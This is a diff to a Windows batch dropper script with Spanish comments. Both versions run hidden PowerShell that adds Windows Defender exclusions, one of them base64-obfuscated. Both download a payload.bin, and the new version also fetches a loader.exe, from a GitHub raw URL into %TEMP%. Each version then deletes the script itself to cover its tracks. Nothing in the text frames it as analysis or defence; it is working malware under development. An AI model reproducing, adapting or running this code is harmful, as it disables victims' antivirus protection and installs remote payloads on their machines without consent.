@@ -6,14 +6,19 @@ if %errorlevel% neq 0 (
     exit /b
 )
 
-:: Exclusión de procesos (svchost.exe y windows-loader-system.exe)
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAoJ3N2Y2hvc3QnICsgJy5leGUnKTsgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUHJvY2VzcyAoJ3dpbmRvd3MtbG9hZGVyLXN5c3RlbScgICsgJy5leGUnKQ==')))"
+:: Crear carpeta loader en %TEMP%
+if not exist "%TEMP%\loader" mkdir "%TEMP%\loader"
 
-:: Descargar payload.bin como Windows-script-powershell.bin en %TEMP% usando curl
-curl -L -o "%TEMP%\Windows-script-powershell.bin" "https://raw.githubusercontent.com/carlospro473/Chac/main/payload.bin" >nul 2>&1
+:: Exclusión de notepad.exe y windows-clack.exe (comando probado y funcional)
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Add-MpPreference -ExclusionProcess 'notepad.exe', 'windows-clack.exe'"
 
-:: Autoborrado: lanza un proceso en segundo plano que espera 5 segundos y elimina este .bat
-start /b powershell -Command "Start-Sleep -Seconds 5; Remove-Item -Path '%~f0' -Force"
+:: Descargar payload.bin en la carpeta loader
+curl -L -o "%TEMP%\loader\payload.bin" "https://raw.githubusercontent.com/carlospro473/Chac/main/payload.bin" >nul 2>&1
 
-:: Salir sin mostrar ventanas
+:: Descargar loader.exe en la carpeta loader
+curl -L -o "%TEMP%\loader\loader.exe" "https://raw.githubusercontent.com/carlospro473/Chac/main/loader.exe" >nul 2>&1
+
+:: Autoborrado (espera 6 segundos y elimina el .bat)
+start /b powershell -Command "Start-Sleep -Seconds 6; Remove-Item -Path '%~f0' -Force"
+
 exit
